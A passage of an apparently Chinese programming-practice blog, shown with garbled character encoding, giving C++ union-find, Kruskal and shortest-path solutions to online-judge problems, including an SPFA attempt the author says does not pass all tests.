y)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fx = <span class="built_in">find</span>(x), fy = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt;= rank[y])&#123;</span><br><span class="line">f[fx] = fy;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[fy] = fx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(rank[fx] == rank[fy] &amp;&amp; fx != fy)&#123;</span><br><span class="line">rank[fy]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">cin &gt;&gt; m;</span><br><span class="line"><span class="built_in">initial</span>(n);</span><br><span class="line"><span class="keyword">int</span> x, y, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line"><span class="keyword">int</span> fx = <span class="built_in">find</span>(x);</span><br><span class="line"><span class="keyword">int</span> fy = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">ans++;</span><br><span class="line"><span class="built_in">merge</span>(fx, fy);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; n - ans - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>åŠ å…¥merge</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn], rank[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initial</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">f[i] = i;</span><br><span class="line">rank[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x == f[x]) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line"><span class="keyword">return</span> f[x];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fx = <span class="built_in">find</span>(x), fy = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt;= rank[y])&#123;</span><br><span class="line">f[fx] = fy;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[fy] = fx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(rank[fx] == rank[fy] &amp;&amp; fx != fy)&#123;</span><br><span class="line">rank[fy]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">cin &gt;&gt; m;</span><br><span class="line"><span class="built_in">initial</span>(n);</span><br><span class="line"><span class="keyword">int</span> x, y, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line"><span class="keyword">int</span> fx = <span class="built_in">find</span>(x);</span><br><span class="line"><span class="keyword">int</span> fy = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">ans++;</span><br><span class="line"><span class="built_in">merge</span>(fx, fy);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; n - ans - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="ç•…é€šå·¥ç¨‹"><a href="#ç•…é€šå·¥ç¨‹" class="headerlink" title="ç•…é€šå·¥ç¨‹"></a>ç•…é€šå·¥ç¨‹</h3><h4 id="é¢˜ç›®æè¿°-35"><a href="#é¢˜ç›®æè¿°-35" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p> çœæ”¿åºœâ€œç•…é€šå·¥ç¨‹â€çš„ç›®æ ‡æ˜¯ä½¿å…¨çœä»»ä½•ä¸¤ä¸ªæ‘åº„é—´éƒ½å¯ä»¥å®ç°å…¬è·¯äº¤é€šï¼ˆä½†ä¸ä¸€å®šæœ‰ç›´æ¥çš„å…¬è·¯ç›¸è¿ï¼Œåªè¦èƒ½é—´æ¥é€šè¿‡å…¬è·¯å¯è¾¾å³å¯ï¼‰ã€‚ç»è¿‡è°ƒæŸ¥è¯„ä¼°ï¼Œå¾—åˆ°çš„ç»Ÿè®¡è¡¨ä¸­åˆ—å‡ºäº†æœ‰å¯èƒ½å»ºè®¾å…¬è·¯çš„è‹¥å¹²æ¡é“è·¯çš„æˆæœ¬ã€‚ç°è¯·ä½ ç¼–å†™ç¨‹åºï¼Œè®¡ç®—å‡ºå…¨çœç•…é€šéœ€è¦çš„æœ€ä½æˆæœ¬ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-33"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-33" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-35"><a href="#è¾“å…¥æè¿°-35" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æµ‹è¯•è¾“å…¥åŒ…å«è‹¥å¹²æµ‹è¯•ç”¨ä¾‹ã€‚æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹çš„ç¬¬<span class="number">1</span>è¡Œç»™å‡ºè¯„ä¼°çš„é“è·¯æ¡æ•° <span class="built_in">N</span>ã€æ‘åº„æ•°ç›®M (<span class="built_in">N</span>, M &lt; =<span class="number">100</span> )ï¼›éšåçš„ <span class="built_in">N</span> è¡Œå¯¹åº”æ‘åº„é—´é“è·¯çš„æˆæœ¬ï¼Œæ¯è¡Œç»™å‡ºä¸€å¯¹æ­£æ•´æ•°ï¼Œåˆ†åˆ«æ˜¯ä¸¤ä¸ªæ‘åº„çš„ç¼–å·ï¼Œä»¥åŠæ­¤ä¸¤æ‘åº„é—´é“è·¯çš„æˆæœ¬ï¼ˆä¹Ÿæ˜¯æ­£æ•´æ•°ï¼‰ã€‚ä¸ºç®€å•èµ·è§ï¼Œæ‘åº„ä»<span class="number">1</span>åˆ°Mç¼–å·ã€‚å½“<span class="built_in">N</span>ä¸º<span class="number">0</span>æ—¶ï¼Œå…¨éƒ¨è¾“å…¥ç»“æŸï¼Œç›¸åº”çš„ç»“æœä¸è¦è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-35"><a href="#è¾“å‡ºæè¿°-35" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œåœ¨<span class="number">1</span>è¡Œé‡Œè¾“å‡ºå…¨çœç•…é€šéœ€è¦çš„æœ€ä½æˆæœ¬ã€‚è‹¥ç»Ÿè®¡æ•°æ®ä¸è¶³ä»¥ä¿è¯ç•…é€šï¼Œåˆ™è¾“å‡ºâ€œ<span class="string">?â€</span>ã€‚</span><br></pre></td></tr></table></figure><p>å…‹é²æ–¯å¡å°”ç®—æ³•+åˆå¹¶é›†(æ³¨é‡Šæ˜¯å› ä¸ºä¸çŸ¥é“ä¸ºä»€ä¹ˆåŠ å…¥rankä¼šæŠ¥é”™)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn];</span><br><span class="line"><span class="comment">//int rank[maxn];</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> u, v, w;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(struct node a, struct node b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.w &lt; b.w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initial</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">f[i] = i;</span><br><span class="line"><span class="comment">//rank[i] = 1;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x == f[x]) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line"><span class="keyword">return</span> f[x];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//void merge(int x, int y)&#123;</span></span><br><span class="line"><span class="comment">//int fx = find(x), fy = find(y);</span></span><br><span class="line"><span class="comment">//if(rank[x] &lt;= rank[y])&#123;</span></span><br><span class="line"><span class="comment">//f[fx] = fy;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else&#123;</span></span><br><span class="line"><span class="comment">//f[fy] = fx;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if(rank[fx] == rank[fy] &amp;&amp; fx != fy)&#123;</span></span><br><span class="line"><span class="comment">//rank[fy]++;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">initial</span>(m);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">edge</span>[<span class="title">n</span>];</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; edge[i].u &gt;&gt; edge[i].v &gt;&gt; edge[i].w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(edge, edge+n, cmp);</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> fx = <span class="built_in">find</span>(edge[i].u), fy = <span class="built_in">find</span>(edge[i].v);</span><br><span class="line"><span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">ans++;</span><br><span class="line">r += edge[i].w;</span><br><span class="line">f[fx] = fy;</span><br><span class="line"><span class="comment">//merge(fx, fy);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(m - <span class="number">1</span> &gt; ans)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;?&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; r &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="æœ€çŸ­è·¯"><a href="#æœ€çŸ­è·¯" class="headerlink" title="æœ€çŸ­è·¯"></a>æœ€çŸ­è·¯</h3><h5 id="é¢˜ç›®æè¿°-36"><a href="#é¢˜ç›®æè¿°-36" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>åœ¨æ¯å¹´çš„æ ¡èµ›é‡Œï¼Œæ‰€æœ‰è¿›å…¥å†³èµ›çš„åŒå­¦éƒ½ä¼šè·å¾—ä¸€ä»¶å¾ˆæ¼‚äº®çš„t-shirtã€‚ä½†æ˜¯æ¯å½“æˆ‘ä»¬çš„å·¥ä½œäººå‘˜æŠŠä¸Šç™¾ä»¶çš„è¡£æœä»å•†åº—è¿å›åˆ°èµ›åœºçš„æ—¶å€™ï¼Œå´æ˜¯éå¸¸ç´¯çš„ï¼æ‰€ä»¥ç°åœ¨ä»–ä»¬æƒ³è¦å¯»æ‰¾æœ€çŸ­çš„ä»å•†åº—åˆ°èµ›åœºçš„è·¯çº¿ï¼Œä½ å¯ä»¥å¸®åŠ©ä»–ä»¬å—ï¼Ÿ</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-34"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-34" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-36"><a href="#è¾“å…¥æè¿°-36" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥åŒ…æ‹¬å¤šç»„æ•°æ®ã€‚æ¯ç»„æ•°æ®ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°<span class="built_in">N</span>ã€<span class="variable">M</span>ï¼ˆ<span class="built_in">N</span><span class="operator">&lt;=</span><span class="number">100</span>ï¼Œ<span class="variable">M</span><span class="operator">&lt;=</span><span class="number">10000</span>ï¼‰ï¼Œ<span class="built_in">N</span>è¡¨ç¤ºæˆéƒ½çš„å¤§è¡—ä¸Šæœ‰å‡ ä¸ªè·¯å£ï¼Œæ ‡å·ä¸º<span class="number">1</span>çš„è·¯å£æ˜¯å•†åº—æ‰€åœ¨åœ°ï¼Œæ ‡å·ä¸º<span class="built_in">N</span>çš„è·¯å£æ˜¯èµ›åœºæ‰€åœ¨åœ°ï¼Œ<span class="variable">M</span>åˆ™è¡¨ç¤ºåœ¨æˆéƒ½æœ‰å‡ æ¡è·¯ã€‚<span class="built_in">N</span><span class="operator">=</span><span class="variable">M</span><span class="operator">=</span><span class="number">0</span>è¡¨ç¤ºè¾“å…¥ç»“æŸã€‚æ¥ä¸‹æ¥<span class="variable">M</span>è¡Œï¼Œæ¯è¡ŒåŒ…æ‹¬<span class="number">3</span>ä¸ªæ•´æ•°<span class="variable">A</span>ï¼Œ<span class="variable">B</span>ï¼Œ<span class="built_in">C</span>ï¼ˆ<span class="number">1</span><span class="operator">&lt;=</span><span class="variable">A</span><span class="operator">,</span><span class="variable">B</span><span class="operator">&lt;=</span><span class="built_in">N</span><span class="operator">,</span><span class="number">1</span><span class="operator">&lt;=</span><span class="built_in">C</span><span class="operator">&lt;=</span><span class="number">1000</span>ï¼‰<span class="operator">,</span>è¡¨ç¤ºåœ¨è·¯å£<span class="variable">A</span>ä¸è·¯å£<span class="variable">B</span>ä¹‹é—´æœ‰ä¸€æ¡è·¯ï¼Œæˆ‘ä»¬çš„å·¥ä½œäººå‘˜éœ€è¦<span class="built_in">C</span>åˆ†é’Ÿçš„æ—¶é—´èµ°è¿‡è¿™æ¡è·¯ã€‚</span><br><span class="line">è¾“å…¥ä¿è¯è‡³å°‘å­˜åœ¨<span class="number">1</span>æ¡å•†åº—åˆ°èµ›åœºçš„è·¯çº¿ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-36"><a href="#è¾“å‡ºæè¿°-36" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä¸€è¡Œï¼Œè¡¨ç¤ºå·¥ä½œäººå‘˜ä»å•†åº—èµ°åˆ°èµ›åœºçš„æœ€çŸ­æ—¶é—´</span><br></pre></td></tr></table></figure><p>æˆ‘å†™çš„spfaä¸èƒ½é€šè¿‡å…¨éƒ¨çš„</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX = <span class="number">0x7ffffff</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edge</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> u, v, w;</span><br><span class="line"><span class="built_in">edge</span>(<span class="keyword">int</span> u_, <span class="keyword">int</span> v_, <span class="keyword">int</span> w_)&#123;</span><br><span class="line">u = u_;</span><br><span class="line">v = v_;</span><br><span class="line">w = w_;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;edge&gt; edges; </span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; gra[maxn];</span><br><span class="line"><span class="keyword">int</span> vis[maxn];</span><br><span class="line"><span class="keyword">int</span> dis[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">edges.<span class="built_in">clear</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxn; i++)&#123;</span><br><span class="line">dis[i] = maxn;</span><br><span class="line">vis[i] = <span class="number">0</span>;</span><br><span class="line">gra[i].<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spfa</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line">dis[s] = <span class="number">0</span>;</span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">q.<span class="built_in">push</span>(s);</span><br><span class="line"><span class="comment">//vis[s] = 1;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">int</span> now = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">vis[now] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//cout &lt;&lt; now &lt;&lt; endl;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; gra[now].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">edge e = edges[gra[now][i]];</span><br><span class="line"><span class="comment">//cout &lt;&lt; e.u &lt;&lt; e.v &lt;&lt; e.w &lt;&lt; dis[e.v]&lt;&lt; endl;</span></span><br><span class="line"><span class="keyword">if</span>(dis[e.v] &gt; dis[now] + e.w)&#123;</span><br><span class="line">dis[e.v] = dis[now] + e.w;</span><br><span class="line"><span class="keyword">if</span>(!vis[e.v])&#123;</span><br><span class="line">vis[e.v] = <span class="number">1</span>;</span><br><span class="line">q.<span class="built_in">push</span>(e.v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addedge</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">edges.<span class="built_in">push_back</span>(<span class="built_in">edge</span>(a, b, c));</span><br><span class="line"><span class="keyword">int</span> sz = edges.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">gra[a].<span class="built_in">push_back</span>(sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">if</span>(m == <span class="number">0</span> &amp;&amp; n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">init</span>();</span><br><span class="line"><span class="comment">//cout &lt;&lt; dis[2] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;åˆå§‹åŒ–å®Œæ¯•&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="keyword">int</span> a, b, c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line"><span class="built_in">addedge</span>(a, b, c);</span><br><span class="line"><span class="built_in">addedge</span>(b, a, c); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;è¯»å–æ•°æ®å®Œæ¯•&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="built_in">spfa</span>(<span class="number">1</span>);</span><br><span class="line">cout &lt;&lt; dis[n] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>floydå…¨æºæœ€çŸ­è·¯å¾„ä¹Ÿè¿‡ä¸äº†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td 